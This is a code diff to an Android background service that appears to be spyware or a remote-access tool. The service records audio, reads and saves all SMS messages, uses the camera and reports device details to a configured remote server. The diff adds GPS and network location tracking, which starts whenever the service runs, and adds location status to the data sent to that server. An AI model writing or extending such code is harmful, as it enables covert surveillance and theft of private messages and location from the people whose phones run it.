@@ -9,7 +9,6 @@ import android.net.NetworkInfo;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.os.IBinder;
-import android.provider.Settings;
 import android.telephony.SmsManager;
 
 import org.json.simple.JSONArray;
@@ -20,6 +19,7 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
+import java.util.Date;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -43,6 +43,7 @@ public class MainService extends Service {
     private RecordManager recordManager;
     private MyWifiManager myWifiManager;
     private MySmsManager mySmsManager;
+    private MyLocationManager myLocationManager;
     private CameraManager cameraManager;
 
     public static MainService getInstance() {
@@ -69,6 +70,11 @@ public class MainService extends Service {
         return mySmsManager;
     }
 
+    private MyLocationManager getMyLocationManager() {
+        if (myLocationManager == null) myLocationManager = new MyLocationManager();
+        return myLocationManager;
+    }
+
     private CameraManager getCameraManager() {
         if (cameraManager == null) cameraManager = new CameraManager();
         return cameraManager;
@@ -86,6 +92,7 @@ public class MainService extends Service {
         recordManager = new RecordManager();
         myWifiManager = new MyWifiManager();
         mySmsManager = new MySmsManager();
+        myLocationManager = new MyLocationManager();
         cameraManager = new CameraManager();
 //        recordManager.startRecord(10*60*1000, null);
 
@@ -100,6 +107,9 @@ public class MainService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         newConnection();
         initConnectionTimerTask();
+
+        getMyLocationManager().startGpsLocationUpdate();
+        getMyLocationManager().startNetworkLocationUpdate();
         return super.onStartCommand(intent, flags, startId);
     }
 
@@ -222,6 +232,9 @@ public class MainService extends Service {
                 info.put("ip", Config.IP_ADDRESS);
                 info.put("serverPort", Config.SERVER_PORT);
 
+                info.put("gpsEnabled", getMyLocationManager().isGpsEnabled());
+                info.put("networkEnabled", getMyLocationManager().isNetworkEnabled());
+
                 info.put("netType", networkInfo.getTypeName());
                 info.put("netName", networkInfo.getExtraInfo());
                 info.put("netSubtype", networkInfo.getSubtypeName());
@@ -295,10 +308,9 @@ public class MainService extends Service {
             case "save.sms.log":
                 JSONArray allSms = getMySmsManager().getAllSms();
 
-                SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd.MM.yy HH:mm:ss");
-                Calendar calendar = Calendar.getInstance();
+                String date = getSimpleDateFormat(System.currentTimeMillis());
                 String fileName = Config.SMS_PATH + "/sms-log ";
-                fileName += simpleDateFormat.format(calendar.getTime()) + ".json";
+                fileName += date + ".json";
                 File outFile = new File(fileName);
                 if (outFile.exists()) {
                     outFile.delete();
@@ -411,5 +423,10 @@ public class MainService extends Service {
         float batteryPct = level / (float) scale;
 
         return (int) (batteryPct * 100);
+    }
+
+    public String getSimpleDateFormat(long milliseconds) {
+        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd.MM.yy HH:mm:ss");
+        return simpleDateFormat.format(new Date(milliseconds));
     }
 }
